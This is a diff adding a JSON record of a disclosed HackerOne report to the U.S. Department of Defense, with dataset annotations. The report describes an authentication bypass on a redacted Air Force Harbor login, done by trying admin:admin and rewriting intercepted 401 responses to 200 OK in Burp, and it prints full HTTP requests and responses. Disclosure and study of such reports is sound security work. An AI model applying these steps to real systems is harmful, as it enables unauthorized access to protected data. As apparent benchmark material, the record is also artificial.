@@ -1,0 +1,48 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "ludv1k ",
+    "title": "Authentication bypass leads to Information Disclosure at  U.S Air Force \"https://\u2588\u2588\u2588\"",
+    "content": "\nHi Hackerone Triage team,\nI'm new in this program, what i understood that every Web Owned/Operated by DoD is in scope , so i did some google searches , exactly in wikipedia and i've find this PNG that confirms that U.S Air Force is in scope : https://en.wikipedia.org/wiki/United_States_Department_of_Defense#/media/File:DoD_Organization_December_2013.jpg\nAuthentication vulnerabilities are some of the simplest issues to understand. However, they can be among the most critical due to the obvious relationship between authentication and security. As well as potentially allowing attackers direct access to sensitive data and functionality, they also expose additional attack surface for further exploits.\nSo While testing AIR Force domain \"*.af.mil\" , i've find this subdomain https://\u2588\u2588\u2588/ that have a Login page , it's look like an Admin things , so i did some pentesting , and it's time to Authentication Bypass , especially because it uses APIs to deal with Database.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nU.S Air Force: af.mil\nSteps to Reproduce\nSteps for POC / Exploit :\n1.go \"https://\u2588\u2588\u2588\u2588/harbor/sign-in\" , then username:password as : admin:admin\n2.Please be aware that we are going to intercept every single request in our Process of exploitation ,\n3.Before forwarding the request , using burp actions , use ;\nCode 39 Bytes\n1Do intercept : response to this request\n4.Change the Value of response :\nFrom\nCode 321 Bytes\n1HTTP/1.1 401 Unauthorized\n2vary: Cookie\n3x-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==\n4x-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631\n5date: Sat, 03 Sep 2022 18:42:09 GMT\n6content-length: 0\n7x-envoy-upstream-service-time: 1510\n8server: envoy\n9connection: close\nTO THIS and forwarded it\nCode 312 Bytes\n1HTTP/1.1 200 OK\n2vary: Cookie\n3x-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==\n4x-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631\n5date: Sat, 03 Sep 2022 18:42:09 GMT\n6content-length: 0\n7x-envoy-upstream-service-time: 1510\n8server: envoy\n9connection: close\n10\n5.Ignore the second request about : GET /api/v2.0/systeminfo HTTP/1.1 not neccaserry\n6.Intercept again and use methods in 3,4:\nCode 650 Bytes\n1GET /api/v2.0/users/current HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\n3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\n4Accept: application/json\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/json\n8Cache-Control: no-cache\n9Pragma: no-cache\n10Connection: close\n11Referer: https://\u2588\u2588\u2588\u2588\u2588/harbor/sign-in\n12Cookie: sid=a66e49e995c2fe659086de2237f422c2; _gorilla_csrf=MTY2MjIyOTI3N3xJa05hUkhFeWNGTXhNbU5CUzNwVE1XNU5LM1o0Y2k5WlJWY3ZOVGR1WlZCM2FIRk9jMHBXTUdKc05FVTlJZ289fB0DLyMK59qRUoo_SpL9Sv0QZkyDGLDVGMNa9_UYMSWz\n13Sec-Fetch-Dest: empty\n14Sec-Fetch-Mode: cors\n15Sec-Fetch-Site: same-origin\n16X-FORWARDED-FOR: 127.0.0.1\n*Change it from\nCode 444 Bytes\n1HTTP/1.1 401 Unauthorized\n2content-type: application/json; charset=utf-8\n3vary: Cookie, Accept-Encoding\n4x-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==\n5x-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7\n6date: Sat, 03 Sep 2022 18:45:12 GMT\n7x-envoy-upstream-service-time: 3\n8server: envoy\n9connection: close\n10Content-Length: 61\n11\n12{\"errors\":[{\"code\":\"UNAUTHORIZED\",\"message\":\"UnAuthorize\"}]}\nTo\nCode 398 Bytes\n1HTTP/1.1 200 OK\n2content-type: application/json; charset=utf-8\n3vary: Cookie, Accept-Encoding\n4x-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==\n5x-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7\n6date: Sat, 03 Sep 2022 18:45:12 GMT\n7x-envoy-upstream-service-time: 3\n8server: envoy\n9connection: close\n10Content-Length: 61\n11\n12{\"message\":\"Authorized\"}\n7.Keep intercepting any request and check if response header and body are :\nCode 88 Bytes\n1HTTP/1.1 401 Unauthorized\n2\n3{\"errors\":[{\"code\":\"UNAUTHORIZED\",\"message\":\"UnAuthorize\"}]}\n4\nto\nCode 38 Bytes\n1HTTP/1.1 200 OK\n2{\"message\":Authorized}\nThen BOOM , i was able to enter your data as shown in my ScreenShots , and for sure that when i tap in Profile , i can see UserProfile\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPlease be aware that :\nI wanted to stop my Hacking Process here , for not damaging or harm or delete any data for the server , so if you want to go further with exploitation to increase the impact or clear you mind that is a valid Bug, please let me know as soon as possible\nImpact\nSensitive Information Disclosure\nResults that i've find so far:\nCode 25 Bytes\n1\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nBurp ScreenShot :\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Improper Access Control - Generic"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1665781260,
+    "report_url": "https://hackerone.com/reports/1690548",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Navigate to the login page at 'https://\u2588\u2588\u2588\u2588/harbor/sign-in' and attempt to log in with credentials 'admin:admin'."
+        ],
+        [
+            2,
+            "Intercept the response using Burp Suite and modify the HTTP status code from '401 Unauthorized' to '200 OK' to bypass authentication."
+        ]
+    ],
+    "vuln_description": "The vulnerability is an authentication bypass that allows unauthorized access to sensitive information by manipulating HTTP responses. By changing the response status code from '401 Unauthorized' to '200 OK', an attacker can gain access to restricted areas of the application without valid credentials.",
+    "reason": "The attack involves intercepting and modifying HTTP responses, which is a straightforward process with tools like Burp Suite. The vulnerability does not require understanding complex application states or novel logic, making it relatively easy to discover and exploit.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "idor_detectable": false,
+    "authnz_byppass_detectable": true,
+    "is_simple_payload": false,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "idor_detectable": false,
+        "authnz_byppass_detectable": true
+    }
+}
